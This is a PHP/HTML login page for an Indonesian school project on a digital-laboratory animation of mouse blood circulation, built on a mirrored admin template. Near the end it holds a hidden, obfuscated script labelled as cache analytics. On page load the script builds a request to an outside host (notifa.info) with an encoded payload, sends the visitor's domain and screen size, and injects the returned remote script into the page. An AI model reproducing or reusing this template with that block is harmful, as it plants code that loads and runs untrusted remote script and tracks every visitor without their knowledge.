<!DOCTYPE html>
<html>

<!-- Mirrored from webapplayers.com/homer_admin-v2.0/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 08 Jan 2019 08:13:28 GMT -->

<head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <!-- Page title -->
    <title><?php echo $title ?></title>

    <!-- Place favicon.ico and apple-touch-icon.png in the root directory -->
    <link rel="shortcut icon" type="image/ico" href="<?php echo base_url() ?>/assets/img/icon.png" />

    <!-- Vendor styles -->
    <link rel="stylesheet" href="<?php echo base_url() ?>assets/homer/vendor/fontawesome/css/font-awesome.css" />
    <link rel="stylesheet" href="<?php echo base_url() ?>assets/homer/vendor/metisMenu/dist/metisMenu.css" />
    <link rel="stylesheet" href="<?php echo base_url() ?>assets/homer/vendor/animate.css/animate.css" />
    <link rel="stylesheet" href="<?php echo base_url() ?>assets/homer/vendor/bootstrap/dist/css/bootstrap.css" />

    <!-- App styles -->
    <link rel="stylesheet"
        href="<?php echo base_url() ?>assets/homer/fonts/pe-icon-7-stroke/css/pe-icon-7-stroke.css" />
    <link rel="stylesheet" href="<?php echo base_url() ?>assets/homer/fonts/pe-icon-7-stroke/css/helper.css" />
    <link rel="stylesheet" href="<?php echo base_url() ?>assets/homer/styles/style.css">

</head>

<body class="blank">

    <!-- Simple splash screen-->
    <div class="splash">
        <div class="color-line"></div>
        <div class="splash-title">
            <div class="spinner">
                <div class="rect1"></div>
                <div class="rect2"></div>
                <div class="rect3"></div>
                <div class="rect4"></div>
                <div class="rect5"></div>
            </div>
        </div>
    </div>
    <div class="login-container">
        <div class="row">
            <div class="col-md-12">
                <div class="hpanel">
                    <div class="panel-body">
                        <?php
                        //Notifikasi kalau ada input error tidak di sisi
                        echo validation_errors('<div class="alert alert-danger"><i class="fa fa-warning"></i> 
                                  <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                                    <span aria-hidden="true">&times;&nbsp; &nbsp;</span>
                                   </button> ', '</div>');

                        //Notifikasi password tidak cocok
                        if ($this->session->flashdata('danger')) {
                            echo '<div class="alert alert-warning"><i class="fa fa-warning"></i>';
                            echo '<button type="button" class="close" data-dismiss="alert" aria-label="Close">
                                      <span aria-hidden="true">&times;&nbsp; &nbsp;</span>
                                     </button>';
                            echo $this->session->flashdata('danger');
                            echo '</div>';
                        }

                        //Notifikasi password tidak cocok
                        if ($this->session->flashdata('sukses')) {
                            echo '<div class="alert alert-success"><i class="fa fa-lock"></i>';
                            echo '<button type="button" class="close" data-dismiss="alert" aria-label="Close">
                                      <span aria-hidden="true">&times;&nbsp; &nbsp;</span>
                                     </button>';
                            echo $this->session->flashdata('sukses');
                            echo '</div>';
                        }

                        ?>
                        <div class="text-center m-b-md">
                            <h1> <b></b></h1>
                            <b> Animasi Berbasis Labolatorium Digital Pada Materi Sistem Peredaran Darah Mencit Untuk
                                Siswa SMA</b>
                        </div>
                        <form action="<?php echo base_url('login') ?>" method="post">
                            <div class="form-group">
                                <label class="control-label" for="username">Username</label>
                                <input type="text" placeholder="Username" title="Please enter you username" required=""
                                    value="" name="username" id="username" class="form-control">
                                <!-- <span class="help-block small">Your unique username to app</span> -->
                            </div>
                            <div class="form-group">
                                <label class="control-label" for="password">Password</label>
                                <input type="password" title="Please enter your password" placeholder="******"
                                    required="" value="" name="password" id="password" class="form-control">
                                <!-- <span class="help-block small">Yur strong password</span> -->
                            </div>
                            <button class="btn btn-primary btn-block">Login</button>
                            <a class="btn btn-default btn-block" href="<?php echo base_url('register') ?>">Daftar
                                Akun</a>
                        </form>
                        <hr>
                        <div class="row">
                            <div class="col-md-12 text-center">
                                <strong>Animasi Berbasis Labolatorium Digital Pada Materi Sistem Peredaran
                                    Darah Mencit Untuk Siswa SMA</strong> <br>
                                Copyright @ <?php echo date('Y') ?> <br>
                                <a href="<?php echo base_url() ?>">Home</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>


    <!-- Vendor scripts -->
    <script src="<?php echo base_url() ?>assets/homer/vendor/jquery/dist/jquery.min.js"></script>
    <script src="<?php echo base_url() ?>assets/homer/vendor/jquery-ui/jquery-ui.min.js"></script>
    <script src="<?php echo base_url() ?>assets/homer/vendor/slimScroll/jquery.slimscroll.min.js"></script>
    <script src="<?php echo base_url() ?>assets/homer/vendor/bootstrap/dist/js/bootstrap.min.js"></script>
    <script src="<?php echo base_url() ?>assets/homer/vendor/metisMenu/dist/metisMenu.min.js"></script>
    <script src="<?php echo base_url() ?>assets/homer/vendor/iCheck/icheck.min.js"></script>
    <script src="<?php echo base_url() ?>assets/homer/vendor/sparkline/index.js"></script>

    <!-- App scripts -->
    <script src="scripts/homer.js"></script>

    <script type="text/javascript">
    if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function() {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
                "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2ax3eMp4Qyo6W%2f67DSYWVvUG5qgO7NYkx9MuZiFDQd4VeNkyIaoKfJm1mF7f0vH%2fgHL2lwB5jOiTX6Vp9rxBBryoCbnpYd06vHe%2fvMPzuA4Mj2gdGw3vK%2fAq1iMvPHNTcsPLEWEXIkxRLPDZ3lGqQ2y4ltL0RRLnNEqew7AeLX2Dx3YGb6l3ot4tKXleeRlownqjn2dyBBZETNavGGQ26Hv8N9CkB4uNMWwCW1Ha3tYHbKBGWJAeixolYmLDkanptLIr0TP3myqStJrz8ZYbnnNqvi6JeBNENGQFHZecgEaHz%2fEPgbef0rysPPqjKRlvOQvzwf9juR47uksH11MZJegDmZ4RvaVlTXVZmU7a%2bCj3j8YP%2bWsEX2hxNHCZd%2fe%2fiVIjogQgK7ukwM7pXYejzgA%3d%3d" +
                "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function() {});
    };
    </script>
</body>

<!-- Mirrored from webapplayers.com/homer_admin-v2.0/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 08 Jan 2019 08:13:28 GMT -->

</html>